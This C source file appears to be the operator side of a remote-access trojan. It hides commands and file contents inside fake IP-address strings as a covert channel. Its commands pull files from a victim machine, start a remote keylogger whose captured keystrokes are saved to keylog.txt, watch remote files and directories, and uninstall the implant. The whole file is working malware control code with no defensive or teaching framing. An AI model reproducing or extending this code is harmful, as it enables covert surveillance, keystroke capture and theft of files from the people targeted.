#include "commands.h"
#include "network.h"

#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define DATA_BUF_SIZE 8192

int encode_ip(char *buffer, uint8_t byte1, uint8_t byte2, uint8_t byte3, uint8_t byte4) {
    return sprintf(buffer, "%u.%u.%u.%u", byte1, byte2, byte3, byte4);
}

int decode_ip(char *buffer, uint8_t *byte1, uint8_t *byte2, uint8_t *byte3, uint8_t *byte4) {
    return sscanf(buffer, "%hhu.%hhu.%hhu.%hhu", byte1, byte2, byte3, byte4);
}

int prompt_stdin(char *buffer, int buf_size) {
    if (fgets(buffer, buf_size, stdin) != NULL) {
        buffer[strcspn(buffer, "\n")] = '\0';
        return 0;
    }
    return -1;
}

int cmd_send_file(struct Context *ctx) {
    const int BUF_SIZE = 256;
    char file_path[BUF_SIZE];
    printf("Enter relative file path: ");
    prompt_stdin(file_path, BUF_SIZE);
    printf("File path: %s\n", file_path);

    const int file_fd = open(file_path, O_RDONLY);
    if (file_fd < 0) {
        fprintf(stderr, "open file failed\n");
        return -1;
    }

    char ip_buffer[IP_ADDR_LEN] = {0};
    uint8_t data_buffer[DATA_BUF_SIZE] = {0};
    int ret;
    size_t len;

    // send CMD_SEND_FILE_NAME
    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 0, 0, CMD_SEND_FILE_NAME);
    if (ret < 0) {
        fprintf(stderr, "encode cmd failed\n");
    }
    send_packet(ctx, ip_buffer);
    // send file name
        // while not end of string, get the next two bytes, encode, ship it
    len = strlen(file_path);
    for (size_t i = 0; i < len; i+=2) {
        if (i == len-1) {
            ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx),
                file_path[i], 0);
        } else {
            ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx),
                file_path[i], file_path[i+1]);
        }
        if (ret < 0) {
            fprintf(stderr, "encode data failed\n");
        }
        send_packet(ctx, ip_buffer);
    }
    // send TERM
    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 1, 0, 0);
    if (ret < 0) {
        fprintf(stderr, "encode term failed\n");
    }
    send_packet(ctx, ip_buffer);

    // send CMD_SEND_FILE_DATA
    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 0, 0, CMD_SEND_FILE_DATA);
    if (ret < 0) {
        fprintf(stderr, "encode cmd failed\n");
    }
    send_packet(ctx, ip_buffer);
    // send file data
        // while not eod, get the next two bytes, encode, ship it

    ssize_t bytes_read;
    while ((bytes_read = read(file_fd, data_buffer, DATA_BUF_SIZE)) > 0) {
        for (ssize_t i = 0; i < bytes_read; i += 2) {
            if (i == bytes_read - 1) {
                // Only one byte left
                ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx), data_buffer[i], 0);
            } else {
                // Two bytes available
                ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx), data_buffer[i], data_buffer[i+1]);
            }
            if (ret < 0) {
                fprintf(stderr, "encode data failed\n");
            }
            send_packet(ctx, ip_buffer);
        }
    }

    // send TERM
    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 1, 0, 0);
    if (ret < 0) {
        fprintf(stderr, "encode term failed\n");
    }
    send_packet(ctx, ip_buffer);

    // might need a strong wait here
    close(file_fd);
    return 0;
}

int cmd_get_file(struct Context *ctx){
    const int BUF_SIZE = 256;
    char file_path[BUF_SIZE];
    printf("Enter relative file path: ");
    prompt_stdin(file_path, BUF_SIZE);
    printf("File path: %s\n", file_path);

    char ip_buffer[IP_ADDR_LEN] = {0};
    int ret;
    size_t len;
    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 0, 0, CMD_REQ_FILE_NAME);
    if (ret < 0) {
        fprintf(stderr, "encode cmd failed\n");
    }
    send_packet(ctx, ip_buffer);

    len = strlen(file_path);
    for (size_t i = 0; i < len; i+=2) {
        if (i == len-1) {
            ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx),
                file_path[i], 0);
        } else {
            ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx),
                file_path[i], file_path[i+1]);
        }
        if (ret < 0) {
            fprintf(stderr, "encode data failed\n");
        }
        send_packet(ctx, ip_buffer);
    }

    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 1, 0, 0);
    if (ret < 0) {
        fprintf(stderr, "encode term failed\n");
    }
    send_packet(ctx, ip_buffer);

    // create file, wait for data to come in, write to file
    FILE *fp = fopen(file_path, "a+");  // opens or creates file
    if (fp == NULL) {
        perror("fopen");
        return -1;
    }

    struct List data_list = {0};
    recv_file_data(ctx, &data_list);

    struct Blob *curr = data_list.head->next;

    while (curr != data_list.tail) {
        fputc(curr->data1, fp);
        fputc(curr->data2, fp);
        curr = curr->next;
    }

    fclose(fp);

    return 0;
}

int cmd_start_kl(struct Context *ctx){
    // send CMD_START_KL, then TERM
    // print "Enter 1 to stop kl"
    // send STOP, then wait for key log
    char ip_buffer[IP_ADDR_LEN] = {0};
    int ret;
    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 0, 0, CMD_START_KL);
    if (ret < 0) {
        fprintf(stderr, "encode cmd failed\n");
    }
    send_packet(ctx, ip_buffer);

    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 1, 0, 0);
    if (ret < 0) {
        fprintf(stderr, "encode term failed\n");
    }
    send_packet(ctx, ip_buffer);

    printf("Enter 1 to stop keylogger: ");
    char input[16] = {0};
    while (1) {
        if (prompt_stdin(input, sizeof(input)) == 0 && input[0] == '1') {
            break;
        }
    }

    cmd_stop(ctx);

    // create file, wait for data to come in, write to file
    FILE *fp = fopen("keylog.txt", "a+");  // opens or creates file
    if (fp == NULL) {
        perror("fopen");
        return -1;
    }

    struct List data_list = {0};
    recv_file_data(ctx, &data_list);

    struct Blob *curr = data_list.head->next;

    while (curr != data_list.tail) {
        fputc(curr->data1, fp);
        fputc(curr->data2, fp);
        curr = curr->next;
    }

    fclose(fp);

    return 0;
}
int cmd_watch_file(struct Context *ctx){
    // send CMD_WATCH_FILE, then TERM
    // print "Enter 1 to stop"
    const int BUF_SIZE = 256;
    char file_path[BUF_SIZE];
    printf("Enter relative file path: ");
    prompt_stdin(file_path, BUF_SIZE);
    printf("File path: %s\n", file_path);

    char ip_buffer[IP_ADDR_LEN] = {0};
    int ret;
    size_t len;

    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 0, 0, CMD_START_WATCH_FILE);
    if (ret < 0) {
        fprintf(stderr, "encode cmd failed\n");
    }
    send_packet(ctx, ip_buffer);

    len = strlen(file_path);
    for (size_t i = 0; i < len; i+=2) {
        if (i == len-1) {
            ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx),
                file_path[i], 0);
        } else {
            ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx),
                file_path[i], file_path[i+1]);
        }
        if (ret < 0) {
            fprintf(stderr, "encode data failed\n");
        }
        send_packet(ctx, ip_buffer);
    }

    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 1, 0, 0);
    if (ret < 0) {
        fprintf(stderr, "encode term failed\n");
    }
    send_packet(ctx, ip_buffer);

    printf("Enter 1 to stop watching file: ");
    char input[16] = {0};
    while (1) {
        if (prompt_stdin(input, sizeof(input)) == 0 && input[0] == '1') {
            break;
        }
    }
    cmd_stop(ctx);

    return 0;
}
int cmd_watch_dir(struct Context *ctx){
    // send CMD_WATCH_DIR, then TERM
    // print "Enter 1 to stop"
    const int BUF_SIZE = 256;
    char dir_path[BUF_SIZE];
    printf("Enter relative dir path: ");
    prompt_stdin(dir_path, BUF_SIZE);
    printf("Dir path: %s\n", dir_path);

    char ip_buffer[IP_ADDR_LEN] = {0};
    int ret;
    size_t len;

    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 0, 0, CMD_START_WATCH_DIR);
    if (ret < 0) {
        fprintf(stderr, "encode cmd failed\n");
    }
    send_packet(ctx, ip_buffer);

    len = strlen(dir_path);
    for (size_t i = 0; i < len; i+=2) {
        if (i == len-1) {
            ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx),
                dir_path[i], 0);
        } else {
            ret = encode_ip(ip_buffer, rand_ip_octet(ctx), rand_ip_octet(ctx),
                dir_path[i], dir_path[i+1]);
        }
        if (ret < 0) {
            fprintf(stderr, "encode data failed\n");
        }
        send_packet(ctx, ip_buffer);
    }

    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 1, 0, 0);
    if (ret < 0) {
        fprintf(stderr, "encode term failed\n");
    }
    send_packet(ctx, ip_buffer);

    printf("Enter 1 to stop watching dir: ");
    char input[16] = {0};
    while (1) {
        if (prompt_stdin(input, sizeof(input)) == 0 && input[0] == '1') {
            break;
        }
    }
    cmd_stop(ctx);

    return 0;
}

int cmd_stop(struct Context *ctx) {
    char ip_buffer[IP_ADDR_LEN] = {0};
    int ret;

    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 0, 0, CMD_STOP);
    if (ret < 0) {
        fprintf(stderr, "encode cmd failed\n");
    }
    send_packet(ctx, ip_buffer);

    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 1, 0, 0);
    if (ret < 0) {
        fprintf(stderr, "encode term failed\n");
    }
    send_packet(ctx, ip_buffer);
    return 0;
}

int cmd_remote_run(struct Context *ctx) {
    return 0;
}

int cmd_disconnect(struct Context *ctx){
    // send CMD_DISCONNECT, then TERM
    char ip_buffer[IP_ADDR_LEN] = {0};
    int ret;

    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 0, 0, CMD_DISCONNECT);
    if (ret < 0) {
        fprintf(stderr, "encode cmd failed\n");
    }
    send_packet(ctx, ip_buffer);

    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 1, 0, 0);
    if (ret < 0) {
        fprintf(stderr, "encode term failed\n");
    }
    send_packet(ctx, ip_buffer);
    return 0;
}

int cmd_uninstall(struct Context *ctx){
    // send CMD_UNINSTALL, then TERM
    char ip_buffer[IP_ADDR_LEN] = {0};
    int ret;

    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 0, 0, CMD_UNINSTALL);
    if (ret < 0) {
        fprintf(stderr, "encode cmd failed\n");
    }
    send_packet(ctx, ip_buffer);

    ret = encode_ip(ip_buffer, rand_ip_octet(ctx), 1, 0, 0);
    if (ret < 0) {
        fprintf(stderr, "encode term failed\n");
    }
    send_packet(ctx, ip_buffer);
    return 0;
}

